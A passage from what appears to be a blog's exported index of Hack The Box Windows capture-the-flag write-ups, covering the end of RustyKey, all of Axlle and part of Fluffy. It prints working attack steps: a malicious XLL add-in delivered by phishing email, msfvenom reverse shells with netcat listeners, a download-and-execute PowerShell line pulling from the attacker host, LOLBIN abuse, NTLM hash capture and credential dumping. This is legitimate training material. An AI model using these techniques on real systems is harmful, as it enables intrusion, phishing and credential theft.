S4U2proxy request for service: 'host/dc.rustykey.htb'\n[*] Using domain controller: dc.rustykey.htb (fe80::bd5e:24aa:d271:1fea%11)\n[*] Sending S4U2proxy request to domain controller fe80::bd5e:24aa:d271:1fea%11:88\n[+] S4U2proxy success!\n[*] base64(ticket.kirbi) for SPN 'host/dc.rustykey.htb':\n\n      doIGfjCCBnqgAwIBBaEDAgEWooIFjzCCBYthggWHMIIFg6ADAgEFoQ4bDFJVU1RZS0VZLkhUQqIiML\n                                        <SNIP>\n[+] Ticket successfully imported!\n```\n***For myself, I like to use `/ptt` which does pass-the-ticket but allows me to know that `Rubeus` succeeded. Then I can look at the ticket on the host system to make sure everything is correct.***\n\nThis gets us a TGS for the user *backupadmin*, from here we can import and *secretsdump*. (using a script for my b64 TGS)\n\n```bash\nkonoha# source ./converITAll.sh doIGfjCCBnqgAwIBBaEDAgEWooIFjzCCBYthggWHMIIFg6ADAgEFoQ4bDFJ<SNIP>\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] converting kirbi to ccache...\n[+] done\nTicket cache: FILE:./Admin.ccache\nDefault principal: backupadmin@RUSTYKEY.HTB\n\nValid starting       Expires              Service principal\n07/01/2025 19:55:02  07/02/2025 05:55:02  host/dc.rustykey.htb@RUSTYKEY.HTB\n\trenew until 07/08/2025 19:55:02\nkonoha# impacket-secretsdump @dc.rustykey.htb -k -no-pass -dc-ip 10.10.11.75\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Service RemoteRegistry is in stopped state\n[*] Starting service RemoteRegistry\n[*] Target system bootKey: 0x94660760272ba2c07b13992b57b432d4\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n```\n\n![](/img/robocop.gif)","tags":["kerberoasting SPNs","Registry","DACL Abuse","COM HiJack","RBCD"],"categories":["htb"]},{"title":"Axlle (Windows Hard)","url":"/2025/06/24/Axlle/","content":"\n![](/img/axlle.png)\n\nAxlle is a hard-level Windows machine that begins with a website running on port 80. The site displays a maintenance message but mentions that Excel invoices can still be sent via email for processing.\n\nAn attacker exploits this by crafting a malicious .XLL file, which bypasses security checks and is used in a phishing attack. Once the attacker gains code execution on the machine, they create a malicious .url file. This file is executed by the user dallon.matrix, leading to the compromise of their account.\n\nThe dallon.matrix user is part of a group that has the ability to change the password of another user, jacob.greeny. The attacker leverages this privilege to reset the password and authenticate as jacob.greeny via WinRM.\n\nThe jacob.greeny user is a member of the App Devs group, which has access to a scheduled automation that runs the StandaloneRunner binary with SYSTEM privileges. The attacker exploits this automated task to escalate privileges and ultimately gain a shell as the Administrator.\n\n## Intial Nmap\n```bash\nPORT      STATE SERVICE       REASON          VERSION\n25/tcp    open  smtp          syn-ack ttl 127 hMailServer smtpd\n| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP\n|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY\n53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus\n80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-favicon: Unknown favicon MD5: FAF2C069F86E802FD21BF15DC8EDD2DC\n| http-methods:\n|   Supported Methods: OPTIONS TRACE GET HEAD POST\n|_  Potentially risky methods: TRACE\n|_http-title: Axlle Development\n88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-24 20:33:49Z)\n135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn\n389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds? syn-ack ttl 127\n464/tcp   open  kpasswd5?     syn-ack ttl 127\n593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped    syn-ack ttl 127\n3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped    syn-ack ttl 127\n5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing\n49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n64934/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n64936/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0\n64937/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n64944/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n64948/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n64956/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n```\n\nFrom our scan we see of the bat port `25/smtp` running and we have port `80/http` open as well. We can check that out first.\n\n## Http for me\n\nLooking over the site it seems pretty static. Yet the about seems interesting.\n\n![](/img/axlle1.png)\n\nMaybe we send a invoice....or 2 ðŸ¤£\n\n## Excelling at everything\n\nIf we have any outstanding invoices we can send them their way in a Excel. Looking more into macros for Excel we come across Excel Add-In. This [article](https://unit42.paloaltonetworks.com/excel-add-ins-malicious-xll-files-agent-tesla/) explains it a bit more in depth, but essentially we can create a `xll` file, really just a `dll` and send it as an attachment in a email. This should get us code execution and a foothold on the box.\n\nWe can create a simple payload and see if we get a callback, we'll start with `ping`:\n```C\n// ping.c\n\n#include <windows.h>\n\n__declspec(dllexport) short __stdcall xlAutoOpen() {\n    WinExec(\"cmd /c ping -n 1 10.10.14.7\", SW_HIDE); // Replace with payload\n    return 1;\n}\n```\n*Note*: We can compile using Visual Studio (`cl.exe`) but this is far easier, if we ran into problems then I would pivot to that. Using just the `__declspec(dllexport) short __stdcall xlAutoOpen()` will export the correct function we need to use for a Excel Add-In. \n\nThen we can compile with `x86_64-w64-mingw32-gcc`:\n```\nkonoha# x86_64-w64-mingw32-gcc ping.c -shared -o ping.xll -s -Os -DUNICODE\n```\n\nWe can now setup a little test using `tcpdump` and using the open `25/smtp` port we can send a little email using `swaks`:\n```bash\nkonoha# swaks --to accounts@axlle.htb --from jay@axlle.htb --header \"Subject: Invoice\\!\" --body \"Take My Money\\!\" --attach @ping.xll\n=== Trying axlle.htb:25...\n=== Connected to axlle.htb.\n<-  220 MAINFRAME ESMTP\n -> EHLO konoha\n<-  250-MAINFRAME\n<-  250-SIZE 20480000\n<-  250-AUTH LOGIN\n<-  250 HELP\n -> MAIL FROM:<jay@axlle.htb>\n<-  250 OK\n -> RCPT TO:<accounts@axlle.htb>\n<-  250 OK\n -> DATA\n<-  354 OK, send.\n -> Date: Tue, 24 Jun 2025 15:59:35 -0500\n -> To: accounts@axlle.htb\n -> From: jay@axlle.htb\n -> Subject: Invoice overdue!\n -> Message-Id: <20250624155935.961242@konoha>\n -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/\n -> MIME-Version: 1.0\n -> Content-Type: multipart/mixed; boundary=\"----=_MIME_BOUNDARY_000_961242\"\n ->\n -> ------=_MIME_BOUNDARY_000_961242\n -> Content-Type: text/plain\n ->\n -> Please pay the attached invioce ASAP. It is past due.\n -> ------=_MIME_BOUNDARY_000_961242\n -> Content-Type: application/octet-stream; name=\"ping.xll\"\n -> Content-Description: ping.xll\n -> Content-Disposition: attachment; filename=\"ping.xll\"\n -> Content-Transfer-Encoding: BASE64\n ->\n -> TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n -> AAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v\n -> ZGUuDQ0KJAAAAAAAAABQRQAAZIYKAJUQW2gAAAAAAAAAAPAALiILAgIsABQAAAAWAAAAAgAAMBMA\n -> AAAQAAAAAGRHAwAAAAAQAAAAAgAABAAAAAAAAAAFAAIAAAAAAADAAAAABAAAGJAAAAMAYAEAACAA\n<SNIP>\n -> QUIT\n<-  221 goodbye\n=== Connection closed with remote host.\n```\n\nWaiting a minute or two and we get a callback.\n```bash\nkonoha# tcpdump -i tun0 icmp\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes\n15:59:47.987219 IP MAINFRAME.axlle.htb > 10.10.14.7: ICMP echo request, id 1, seq 2, length 40\n15:59:47.987303 IP 10.10.14.7 > MAINFRAME.axlle.htb: ICMP echo reply, id 1, seq 2, length 40\n```\n\n## Phishing for entry\n\n![](/img/bait-fishing.gif)\n\nWe can now replace our payload with a powershell(b64) reverse shell and get our shell now. Then after a minute or two.\n```bash\nkonoha# rlwrap -cAr nc -lvnp 443\nlistening on [any] 443 ...\nconnect to [10.10.14.7] from (UNKNOWN) [10.10.11.21] 65335\n\nPS C:\\> whoami\naxlle\\gideon.hamill\n```\n\n## Further enumeration required\n\nNow that we're on the box, we can look around, but first I will get `SharpHound.exe` on the box and then fire up `BloodHoundCE`.\n\n```PowerShell\nPS C:\\> cd C:\\\\ProgramData ; iwr http://10.10.14.7/SharpHound.exe -o SH.exe\nPS C:\\ProgramData> .\\SH.exe -c All\n```\n*It may look like it's not doing anything, give it time to finish...you'll see output.*\n\nAfter it completes we can transfer it over and browse.\n\nBloodhound shows us nothing at the moment for our user. We can enumerate manually on the machine with `PowerView.ps1`and doing this shows that `Web Devs` have special permissions over 2 users.\n```PowerShell\nObjectDN                : CN=Jacob Greeny,DC=axlle,DC=htb\nAceQualifier            : AccessAllowed\nActiveDirectoryRights   : ExtendedRight\nObjectAceType           : User-Force-Change-Password\nAceFlags                : ContainerInherit\nAceType                 : AccessAllowedObject\nInheritanceFlags        : ContainerInherit\nSecurityIdentifier      : S-1-5-21-1005535646-190407494-3473065389-1127\nIdentityReferenceName   : Web Devs\nIdentityReferenceDomain : axlle.htb\nIdentityReferenceDN     : CN=Web Devs,CN=Users,DC=axlle,DC=htb\nIdentityReferenceClass  : group\n\nObjectDN                : CN=Baz Humphries,DC=axlle,DC=htb\nAceQualifier            : AccessAllowed\nActiveDirectoryRights   : ExtendedRight\nObjectAceType           : User-Force-Change-Password\nAceFlags                : None\nAceType                 : AccessAllowedObject\nInheritanceFlags        : None\nSecurityIdentifier      : S-1-5-21-1005535646-190407494-3473065389-1127\nIdentityReferenceName   : Web Devs\nIdentityReferenceDomain : axlle.htb\nIdentityReferenceDN     : CN=Web Devs,CN=Users,DC=axlle,DC=htb\n```\n![](/img/goldeneye-boris.gif)\nSo how do we get ourselves into that group???ðŸ¤”ðŸ¤”\n\n## I smell Mail\n\nWe know that the machine is running a mail server so we can check the obvious places for installed programs and alas we find `hMailServer` in the x86 directory. In that directory lies more data for us.\n```Powershell\nPS C:\\Program Files (x86)\\hMailServer\\Data\\axlle.htb> ls\n\n\n    Directory: C:\\Program Files (x86)\\hMailServer\\Data\\axlle.htb\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----         6/24/2025   2:07 PM                accounts\nd-----         6/24/2025   2:07 PM                Attachments\nd-----          1/1/2024   6:32 AM                dallon.matrix\nd-----         6/24/2025   2:07 PM                ReviewedAttachments\n```\nAnd if we look in to dallon's directory we see an email.\n```PowerShell\nPS C:\\Program Files (x86)\\hMailServer\\Data\\axlle.htb\\dallon.matrix\\2F> ls\n\n\n    Directory: C:\\Program Files (x86)\\hMailServer\\Data\\axlle.htb\\dallon.matrix\\2F\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----          1/1/2024   6:32 AM            997 {2F7523BD-628F-4359-913E-A873FCC59D0F}.eml\n```\nThis email states the following:\n```\nHi everyone,\n\nThe Web Dev group is doing some development to figure out the best way to automate the checking and addition of URLs into the OSINT portal.\n\nWe ask that you drop any web shortcuts you have into the C:\\inetpub\\testing folder so we can test the automation.\n\nYours in click-worthy URLs,\n\nThe Web Dev Team\n```\n![](/img/bazzinga.gif)\n\nSo the `C:\\inetpub\\testing` directory is being monitored for web shortcuts. We can perhaps make a malicious shortcut, like with `lnk` files. Lets create a payload with `msfvenom` and then place it on the box, then create a web shortcut point to it.\n```bash\nkonoha# msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9002 -f exe > s.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of exe file: 7168 bytes\n```\nTransfer to the box and set up our shortcut.\n```\n# web shortcut\n[internetshortcut]\nC:\\\\ProgramData\\s.exe\n```\nWe can then upload it and wait for our callback.\n```bash\nkonoha# rlwrap -cAr nc -lvnp 9002\nlistening on [any] 9002 ...\nconnect to [10.10.14.7] from (UNKNOWN) [10.10.11.21] 53229\nMicrosoft Windows [Version 10.0.20348.2527]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\>whoami\nwhoami\naxlle\\dallon.matrix\n```\n![](/img/perfect.gif)\n## Abuse the bully\n\nNow we know we're apart of the `Web Devs` group fom the ACLs output. We can simply change the password for `jacob.greeny` using `PowerView.ps1`.\n```powershell\nC:\\>powershell -ep bypass\npowershell -ep bypass\nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nInstall the latest PowerShell for new features and improvements! https://aka.ms/PSWindows\n\nPS C:\\> IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.14.7/PowerView.ps1'))\nIEX((New-Object System.Net.WebClient).DownloadString('http://10.10.14.7/PowerView.ps1'))\nPS C:\\> $cred = ConvertTo-SecureString 'Welcome123!' -AsPlainText -Force\n$cred = ConvertTo-SecureString 'Welcome123!' -AsPlainText -Force\nPS C:\\> Set-DomainUserPassword -Identity jacob.greeny -AccountPassword $cred -Verbose\nSet-DomainUserPassword -Identity jacob.greeny -AccountPassword $cred -Verbose\nVERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'jacob.greeny'\nVERBOSE: [Set-DomainUserPassword] Password for user 'jacob.greeny' successfully reset\n```\n\n## Pure Evil\n\nJacob gets us a WinRM session on the box. Looking at bloodhound we we're part of the `App Devs` group. \n\n![](/img/axlle2.png)\n\nLooking back at the root we did have a directory we couldn't access called `App Development`. This directory has a `README.md` stating that the aim of this application is to allow users to program and simulate custom keyboard layouts. Devs must be building something for their clients or vendors.\n```powershell\n*Evil-WinRM* PS C:\\App Development\\kbfiltr> ls\n\n\n    Directory: C:\\App Development\\kbfiltr\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----          1/1/2024  10:03 PM                exe\nd-----          1/1/2024  10:03 PM                sys\n-a----        12/14/2023  11:39 AM           2528 kbfiltr.sln\n-a----         6/11/2024  11:16 PM           2805 README.md\n```\n\n`**NOTE: I have automated the running of 'C:\\Program Files (x86)\\Windows Kits\\10\\Testing\\StandaloneTesting\\Internal\\x64\\standalonerunner.exe' as SYSTEM to test and debug this driver in a standalone environment**`\n\nIt states that `standalonerunner.exe` is running as `SYSTEM` to test and debug the driver. If we look up more on the `exe` we find an [article](https://github.com/nasbench/Misc-Research/blob/main/LOLBINs/StandaloneRunner.md) stating that we can gain arbitrary command execution by making a couple of files and a `command.txt` that will be our binary to execute. \n\n## Privilege for the Strong\n\nAfter reading the github on this vulnerablility I came up with a little one liner, as I'm sure most did. First we must go to the directory where the `exe` and `dll` reside. We can use the same reverse shell we created with `msfvenom` for our `command.txt`.\n\n```PowerShell\n*Evil-WinRM* PS C:\\Program Files (x86)\\Windows Kits\\10\\Testing\\StandaloneTesting\\Internal\\x64> ls\n\n\n    Directory: C:\\Program Files (x86)\\Windows Kits\\10\\Testing\\StandaloneTesting\\Internal\\x64\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         9/30/2023   3:08 AM          33392 standalonerunner.exe\n-a----         9/30/2023   3:08 AM          43632 standalonexml.dll\n\n\n*Evil-WinRM* PS C:\\Program Files (x86)\\Windows Kits\\10\\Testing\\StandaloneTesting\\Internal\\x64> echo \"myTestDir`nTrue\" > reboot.rsf ; mkdir -p myTestDir\\working ; echo \" \" > myTestDir\\working\\rsf.rsf ; echo \"C:\\\\ProgramData\\s.exe\" > command.txt\n\n\n    Directory: C:\\Program Files (x86)\\Windows Kits\\10\\Testing\\StandaloneTesting\\Internal\\x64\\myTestDir\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----         6/24/2025   3:03 PM                working\n\n\n*Evil-WinRM* PS C:\\Program Files (x86)\\Windows Kits\\10\\Testing\\StandaloneTesting\\Internal\\x64> \"C:\\Program Files (x86)\\Windows Kits\\10\\Testing\\StandaloneTesting\\Internal\\x64\\standalonerunner.exe\"\nC:\\Program Files (x86)\\Windows Kits\\10\\Testing\\StandaloneTesting\\Internal\\x64\\standalonerunner.exe\n```\nAfter a couple of minutes we recieve a shell back.\n```bash\nkonoha# rlwrap -cAr nc -lvnp 9002\nlistening on [any] 9002 ...\nconnect to [10.10.14.7] from (UNKNOWN) [10.10.11.21] 52931\nMicrosoft Windows [Version 10.0.20348.2527]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Program Files (x86)\\Windows Kits\\10\\Testing\\StandaloneTesting\\Internal\\x64\\myTestDir\\working>whoami\nwhoami\naxlle\\administrator\n```\n\n![](img/robocop.gif)","tags":["xll","phishing","shortcuts","DACL Abuse","LOLBIN"],"categories":["htb"]},{"title":"Fluffy (Windows Easy)","url":"/2025/05/26/Fluffy/","content":"\n![](/img/fluffy.png)\n\nStarts with `CVE-2025-24996`, which is used to retrieve the hash of `p.agila`. This user Owns the `Service Accounts` OU, and can add themselves. Once done they have GenericWrite, and GenericAll which we can utilize for Shadow Credentials and obtain the hash for `winrm_svc` and other corresponding service accounts (ldap_svc, ca_svc). Having the `ca_svc` who is in `Cert Publishers`, we find a vulnerable template within ADCS. [ESC 16](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6) allows a low-privileged user to escalate their privilege. In doing so, we update the `ca_svc` account upn to `administrator` then request a `pfx`. This give us the *administrator.pfx*. Now we change back the upn for `ca_svc` and we authenticate with the *administrator.pfx* giving us the `administrator` hash.\n\n*As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: rr.j.fleischman / J0elTHEM4n1990!*\n\n## Initial Nmap\n\n```bash\nPORT     STATE SERVICE          REASON\n53/tcp   open  domain           syn-ack\n88/tcp   open  kerberos-sec     syn-ack\n139/tcp  open  netbios-ssn      syn-ack\n389/tcp  open  ldap             syn-ack\n445/tcp  open  microsoft-ds     syn-ack\n464/tcp  open  kpasswd5         syn-ack\n593/tcp  open  http-rpc-epmap   syn-ack\n636/tcp  open  ldapssl          syn-ack\n3268/tcp open  globalcatLDAP    syn-ack\n3269/tcp open  globalcatLDAPssl syn-ack\n5985/tcp open  wsman            syn-ack\n```\nCommon ports for an Active Directory Server.\n\n## SMB\n\nStarting here we can see we have read/write to *IT*. We can check that out and see what it holds.\n```bash\nkonoha# impacket-smbclient 'fluffy.htb/j.fleischman:J0elTHEM4n1990!@fluffy.htb'\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies\n\nType help for list of commands\n# shares\nADMIN$\nC$\nIPC$\nIT\nNETLOGON\nSYSVOL\n# use IT\n# ls\ndrw-rw-rw-          0  Tue Aug 19 01:51:25 2025 .\ndrw-rw-rw-          0  Tue Aug 19 01:51:25 2025 ..\ndrw-rw-rw-          0  Fri May 16 09:51:49 2025 Everything-1.4.1.1026.x64\n-rw-rw-rw-    1827464  Fri May 16 09:51:49 2025 Everything-1.4.1.1026.x64.zip\ndrw-rw-rw-          0  Fri May 16 09:51:49 2025 KeePass-2.58\n-rw-rw-rw-    3225346  Fri May 16 09:51:49 2025 KeePass-2.58.zip\n-rw-rw-rw-     169963  Sat May 17 09:31:07 2025 Upgrade_Notice.pdf\n```\nI don't see any sort of database(db) file, we can look at the Upgrade_Notice.pdf and this shows us some critical vulnerabilities this server is susceptible to.\n![](/img/fluffy1.png)\n\nResearching [CVE-2025-24071](https://www.rapid7.com/db/vulnerabilities/microsoft-windows-cve-2025-24071/) led us looking on github and finding a [CVE](https://github.com/0x6rss/CVE-2025-24071_PoC.git) we can use. We simply create a file and upload, which in turn gets us the hash for *p.agila*.\n```bash\nkonoha# impacket-smbclient 'fluffy.htb/j.fleischman:J0elTHEM4n1990!@fluffy.htb'\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies\n\nType help for list of commands\n# use IT\nl# ls\ndrw-rw-rw-          0  Tue Aug 19 02:01:51 2025 .\ndrw-rw-rw-          0  Tue Aug 19 02:01:51 2025 ..\ndrw-rw-rw-          0  Fri May 16 09:51:49 2025 Everything-1.4.1.1026.x64\n-rw-rw-rw-    1827464  Fri May 16 09:51:49 2025 Everything-1.4.1.1026.x64.zip\ndrw-rw-rw-          0  Fri May 16 09:51:49 2025 KeePass-2.58\n-rw-rw-rw-    3225346  Fri May 16 09:51:49 2025 KeePass-2.58.zip\n-rw-rw-rw-     169963  Sat May 17 09:31:07 2025 Upgrade_Notice.pdf\n# put exploit.zip\n# cd Everything-1.4.1.1026.x64\n# put exploit.zip\n# cd ..\n# cd KeePass-2.58\n# put exploit.zip\n#\n```\nThen listen.\n```bash\nkonoha# responder -I tun0\n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR & MDNS Responder 3.1.6.0\n\n<SNIP>\n\n[+] Listening for events...\n\n[SMB] NTLMv2-SSP Client   : 10.10.11.69\n[SMB] NTLMv2-SSP Username : FLUFFY\\p.agila\n[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:a74aa9fa1b5735bd:<SNIP>\n```\nAnd once cracked we can see permissions this user has.\n\n## BloodHound/BloodyAD\n\nOur user, *p.agila* owns `Service Accounts`, and can edit the DACL. We can give p.agila FullControl over the DACL.\n\n![](/img/fluffy2.png)\n\n**With BloodyAD**\n```bash\nkonoha# bloodyAD -v DEBUG -d fluffy.htb -u p.agila -p <SNIP> --dc-ip 10.10.11.69 --host fluffy.htb add genericAll 'Service Accounts' 'p.agila'\n[+] Connection URL: ldap+ntlm-pw://fluffy.htb\\p.agila:<SNIP>@fluffy.htb/?serverip=10.10.11.69\n[*] Trying to connect to fluffy.htb...\n[+] Connection successful\n[*] Old Security Descriptor: D:AI(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;CR;ab721a55-1e2f-11d0-9819-00aa0040529b;;S-1-5-11)(A;;0xf01ff;;;S-1-5-21-497550768-2797716248-2627064577-512)(A;CI;0xf01ff;;;S-1-5-21-497550768-2797716248-2627064577-1604)(A;;0xf01ff;;;S-1-5-32-548)(A;;0x20094;;;S-1-5-10)(A;;0x20094;;;S-1-5-11)(A;;0xf01ff;;;S-1-5-18)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-497550768-2797716248-2627064577-526)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-497550768-2797716248-2627064577-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-3-0)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;0x20094;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;0x20094;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;OICIID;0x30;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;S-1-5-10)(OA;CIID;0x130;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;S-1-5-10)(A;CIID;0xf01ff;;;S-1-5-21-497550768-2797716248-2627064577-519)(A;CIID;LC;;;S-1-5-32-554)(A;CIID;0xf01bd;;;S-1-5-32-544)\n[+] p.agila has now GenericAll on Service Accounts\n```\nThen we can add ourselves to the group:\n```bash\nkonoha# bloodyAD -d fluffy.htb -u p.agila  -p <SNIP> --host fluffy.htb add groupMember 'Service Accounts' 'p.agila'\n[+] p.agila added to Service Accounts\n```\n## In the Shadows\n\nIf we look at what permissions *Service Accounts* has we can see some interesting users.\n![](/img/fluffy3.png)\n\nSince we have *GenericWrite*, we can just add *shadow credentials* for winrm_svc and the others.\n```bash\nkonoha# certipy shadow auto -u 'p.agila@fluffy.htb' -p '<SNIP>' -account winrm_svc -dc-ip 10.10.11.69\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Targeting user 'winrm_svc'\n[*] Generating certificate\n[*] Certificate generated\n[*] Generating Key Credential\n[*] Key Credential generated with DeviceID 'cb5debf6-c514-d129-7371-3f40a64fc9d8'\n[*] Adding Key Credential with device ID 'cb5debf6-c514-d129-7371-3f40a64fc9d8' to the Key Credentials for 'winrm_svc'\n[*] Successfully added Key Credential with device ID 'cb5debf6-c514-d129-7371-3f40a64fc9d8' to the Key Credentials for 'winrm_svc'\n[*] Authenticating as 'winrm_svc' with the certificate\n[*] Certificate identities:\n[*]     No identities found in this certificate\n[*] Using principal: 'winrm_svc@fluffy.htb'\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saving credential cache to 'winrm_svc.ccache'\n[*] Wrote credential cache to 'winrm_svc.ccache'\n[*] Trying to retrieve NT hash for 'winrm_svc'\n[*] Restoring the old Key Credentials for 'winrm_svc'\n[*] Successfully restored the old Key Credentials for 'winrm_svc'\n[*] NT hash for 'winrm_svc': <SNIP>\n```\nThen for *ca_svc*:\n```bash\nkonoha# certipy shadow auto -u 'p.agila@fluffy.htb' -p '<SNIP>' -account ca_svc -dc-ip 10.10.11.69\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Targeting user 'ca_svc'\n[*] Generating certificate\n[*] Certificate generated\n[*] Generating Key Credential\n[*] Key Credential generated with DeviceID 'a579746f-641a-f46c-6b2f-3c1872d0d203'\n[*] Adding Key Credential with device ID 'a579746f-641a-f46c-6b2f-3c1872d0d203' to the Key Credentials for 'ca_svc'\n[*] Successfully added Key Credential with device ID 'a579746f-641a-f46c-6b2f-3c1872d0d203' to the Key Credentials for 'ca_svc'\n[*] Authenticating as 'ca_svc' with the certificate\n[*] Certificate identities:\n[*]     No identities found in this certificate\n[*] Using principal: 'ca_svc@fluffy.htb'\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saving credential cache to 'ca_svc.ccache'\n[*] Wrote credential cache to 'ca_svc.ccache'\n[*] Trying to retrieve NT hash for 'ca_svc'\n[*] Restoring the old Key Credentials for 'ca_svc'\n[*] Successfully restored the old Key Credentials for 